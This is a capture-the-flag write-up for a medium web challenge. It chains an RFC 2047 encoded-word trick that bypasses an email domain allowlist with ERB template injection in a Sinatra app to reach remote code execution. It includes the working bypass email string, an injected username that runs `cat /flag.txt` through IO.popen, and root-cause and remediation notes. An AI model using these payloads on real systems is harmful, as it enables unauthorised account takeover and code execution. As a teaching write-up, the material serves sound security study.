# BugZzzz — FahemSec Labs Writeup

**Category:** Web Exploitation
**Difficulty:** Medium
**Vulnerabilities chained:** Input Validation Bypass (RFC 2047 abuse) → Server-Side Template Injection (SSTI) → Remote Code Execution

---

## TL;DR

The registration endpoint restricts emails to `@fahemsec.ctf`, but validates the *parsed* domain of an `RFC 2822` address while storing and using the *raw* string elsewhere. By crafting an email using an RFC 2047 encoded-word, the validator sees `fahemsec.ctf` as the domain while the mail delivery layer actually decodes and sends the verification email to an attacker-controlled inbox. Combined with an unsanitized username reflected into an ERB template on the dashboard, this chain leads to full remote code execution and flag disclosure.

---

## Recon

The app is a Sinatra-based registration/login system with email verification, backed by:
- SQLite for user storage
- MailHog as a fake SMTP catcher (internal-only, not exposed to the host per `docker-compose.yml`)
- ERB templates for rendering

Key routes:
| Route | Purpose |
|---|---|
| `POST /register` | Create account, restricted to `@fahemsec.ctf` emails |
| `GET /verify` | Verify account via emailed token |
| `POST /login` | Authenticate |
| `GET /getMailAddress` | Generates a disposable `@example.com` address, stored in session |
| `GET /getMails` | Reads MailHog inbox filtered by `session[:generated_email]` |
| `GET /dashboard` | Authenticated landing page — reflects the logged-in username |

## Step 1 — Spotting the domain validation

```ruby
mail_address = Mail::Address.new(email)
domain = mail_address.domain

allowed_domains = ['fahemsec.ctf']
if !allowed_domains.include?(domain)
  # reject
end
```

`Mail::Address` is a full RFC 2822/2047-aware parser — it validates far more than a naive string check would. Critically, `email` (the raw variable) is what's later passed to `create_user` and to `Mail.deliver ... to email`, **not** any normalized/decoded value. This is a **validator/consumer mismatch**: two different code paths trust the same variable to mean two different things.

## Step 2 — Bypassing with RFC 2047 encoded-words

RFC 2047 lets email headers contain encoded ("non-ASCII-safe") text via the syntax:
```
=?charset?encoding?encoded-text?=
```

Payload used:
```
=?utf-8?q?ATTACKER_LOCALPART=40example.com=3e=20?=@fahemsec.ctf
```

Breakdown:
- `=40` → `@` (hex/quoted-printable escape)
- `=3e` → `>`
- `=20` → space

Decoded, the encoded-word segment reads as `ATTACKER_LOCALPART@example.com> ` — which `Mail::Address` interprets as a display-name/comment-like prefix, treating the segment *after* it (`@fahemsec.ctf`) as the actual address domain.

- **Validator's view:** domain = `fahemsec.ctf` → passes the allowlist check.
- **Raw stored/used value:** the full literal string, which — once decoded by the mail delivery layer — actually routes the email to `ATTACKER_LOCALPART@example.com`.

By setting `ATTACKER_LOCALPART` to match the disposable address obtained from `/getMailAddress`, the verification email — nominally sent to a `@fahemsec.ctf` account — is actually delivered to an attacker-readable `@example.com` inbox, retrievable via `/getMails`.

## Step 3 — Spotting the SSTI surface

The dashboard template (`.erb` extension → Embedded Ruby) reflects the logged-in username directly:

```erb
<!-- dashboard.erb -->
... <%= session[:username] %> ...
```

No sanitization or escaping is applied to user-supplied usernames before storage or before this reflection.

## Step 4 — Full exploit chain

1. **Get a disposable address:**
   ```
   GET /getMailAddress
   → { "email": "abc123xyz@example.com" }
   ```

2. **Register with a malicious username and the RFC 2047 bypass email:**
   ```json
   POST /register
   {
     "username": "<%= IO.popen('cat /flag.txt').read %> <%= 0000 %>",
     "email": "=?utf-8?q?abc123xyz=40example.com=3e=20?=@fahemsec.ctf",
     "password": "Test1234!"
   }
   ```
   (The `<%= 0000 %>` suffix avoids username collisions across repeated attempts.)

3. **Retrieve the verification link:**
   ```
   GET /getMails
   ```
   The email — nominally sent to the `@fahemsec.ctf` account — appears here, since it was actually delivered to `abc123xyz@example.com`.

4. **Visit the verification link** from the email body to activate the account.

5. **Log in** using the *exact raw* email string used at registration (the literal encoded-word payload, not the decoded form) and the chosen password.

6. **View `/dashboard`** — the ERB template renders `<%= IO.popen('cat /flag.txt').read %>` as live Ruby, executing the command and printing the flag contents directly on the page.

## Root causes

1. **Validation/usage mismatch** — the domain allowlist check operates on a parsed/decoded representation while downstream code (DB storage, mail delivery) operates on the raw string.
2. **No output encoding on user-controlled data rendered in ERB** — usernames are stored and reflected verbatim, with no HTML-escaping (`<%=` vs a sanitizing helper) and, more critically, are trusted as *safe to display* despite user control.
3. **Architectural risk in the ERB rendering** — usernames should never influence template *behavior*; only ever be inserted as *data* into an already-compiled template.

## Remediations

- Validate emails against the **raw string** with a strict regex/allowlist (e.g., `email =~ /\A[\w.+-]+@fahemsec\.ctf\z/`) rather than relying on a permissive RFC 2822 parser's derived `.domain`.
- Never decode/normalize input for validation purposes using a different code path than the one used for storage/action.
- HTML-escape all user-controlled output in ERB templates by default (Sinatra: use `Rack::Utils.escape_html`, or a helper, on any interpolated user data).
- More fundamentally: usernames (or any free-text user input) should never be capable of being interpreted as template *syntax* — this requires the input to only ever be used as a *value*, never concatenated into template source.

---

## Key takeaways / patterns for future challenges

- **Validator/consumer mismatch**: always check whether a security check operates on the same representation of data that's later used.
- **Parser differentials**: structured formats (email, URL, JSON, Unicode) often have multiple "valid" interpretations — a prime bypass surface whenever a parsing library is used for security decisions.
- **Reflected input + templating file extensions (`.erb`, `.jinja`, `.twig`, etc.) → check for SSTI** as a standing reflex.
- **Trace bypasses forward**: a validation bypass alone isn't impact — follow the tainted value through every downstream consumer to find the real chain.
